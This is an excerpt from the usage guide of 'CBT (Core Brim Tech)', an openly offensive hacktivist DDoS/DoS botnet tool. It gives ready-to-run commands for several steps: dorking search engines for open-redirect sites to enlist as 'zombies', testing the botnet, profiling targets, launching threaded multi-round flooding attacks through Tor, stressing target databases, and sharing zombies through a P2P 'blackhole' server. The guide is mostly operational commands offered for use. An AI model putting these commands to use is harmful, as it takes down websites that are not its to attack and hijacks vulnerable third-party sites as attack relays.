...
Welcome to CBT (Core Brim Tech) [ DDoS+DoS ] Botnet/C&C/Darknet ;-)
...
CBT (Core Brim Tech) - Is a set of hacktivist tools that allow launching coordinated 
...
CBT (Core Brim Tech) runs on many platforms:
...
CBT (Core Brim Tech) can dig on different search engines results to find possible 'Open Redirect' vulnerable sites. 
...
Or providing a list of "dorks" from a file:
       ...
       ./CBT --sd 'botnet/dorks.txt'

By default CBT (Core Brim Tech) will use a search engine called 'DuckDuckGo'. But you can choose a different one:

       ./CBT -s 'page.php?url=' --se 'bing'

You can also search massively using all search engines supported:

       ./CBT -s 'page.php?url=' --sa 

To control how many 'zombies' recieved from the search engines reports you can use:

       ./CBT --sd 'botnet/dorks.txt' --sa --sn 20
...
If your answer is 'Y', your new 'zombies' will be appended to the file named: zombies.txt
  ...
  Examples:
     ...
     + with verbose:       ./CBT -s 'page.php?url=' -v
     + with threads:       ./CBT --sd 'botnet/dorks.txt' --sa --threads 100

###############################
# Testing botnet
###############################

CBT (Core Brim Tech) can test if your 'zombies' are vulnerable and can be used for attacking tasks. 
...
If your answer is 'Y', the file: "botnet/zombies.txt" will be updated.
  ...
  Examples:
     ...
     + with verbose:        ./CBT -t 'botnet/zombies.txt' -v
     + with proxy TOR:      ./CBT -t 'botnet/zombies.txt' --proxy="http://127.0.0.1:8118"
     + with threads:        ./CBT -t 'botnet/zombies.txt' --threads 50

     + test whole botnet:   ./CBT --test-all
     + test XML-RPCs:       ./CBT --test-rpc
     + search for offlines: ./CBT --test-offline 
     + attack yourself:     ./CBT --attack-me

###############################
# Inspecting a target
###############################

CBT (Core Brim Tech) can search for biggest file on your target by crawlering it:

       ./CBT -i http://target.com

You can use this before to attack to be more effective.

       ./CBT -a http://target.com -b "/biggest_file_on_target.xxx"
...
CBT (Core Brim Tech) can provide you some interesting information about your target:

       ./CBT -x http://target.com
...
CBT (Core Brim Tech) can attack your target in many different ways.

For example, enter a target to attack with a number of rounds:

       ./CBT -a http://target.com -r 10

On this example CBT (Core Brim Tech) will attack the target a number of 10 times for each 'zombie'. That means that 
...
this will make the attack more effective.
       ...
       ./CBT -a http://target.com -b "/images/big_size_image.jpg"

  -------------
  Examples:

     + with verbose:     ./CBT -a http://target.com -r 10 -v
     + with proxy TOR:   ./CBT -a http://target.com -r 10 --proxy="http://127.0.0.1:8118"
     + with a place:     ./CBT -a http://target.com -r 10 -b "/images/big_size_image.jpg"
     + with threads:     ./CBT -a http://target.com -r 10 --threads 500

###############################
# Special attacks
###############################

CBT (Core Brim Tech) uses different ways to exploit 'Open Redirect' vulnerabilities.

You can use CBT (Core Brim Tech) to stress database on target by requesting random valid strings as search queries:

       ./CBT -a http://target.com --db "search.php?q="
...
All ways could be combined, so CBT (Core Brim Tech) can attack DDoS and DoS, at the same time.

###############################
# Updating
###############################

CBT (Core Brim Tech) has implemented an option to update the tool to the latest stable version.
...
CBT (Core Brim Tech) has some P2P options to share/keep 'zombies' with other 'motherships'.
      
  * Setup web server with a folder "CBT", this folder should be: 

    - located in /var/www/CBT (default debian/ubuntu install)
    - owned by the user running the blackhole
    - accessible with http://your-ip/CBT/

  * Start the blackhole with: ./CBT --blackhole (or python2 blackhole.py)
...
You can manage CBT (Core Brim Tech) using a Web Interface. The tool has implemented a python web server 
...
This will open a tab on your default browser with all features of the tool and some 'extra' options:
 ...
 - GLOBAL.NEWS: Allows to read news related to CBT (Core Brim Tech)
 - [...]
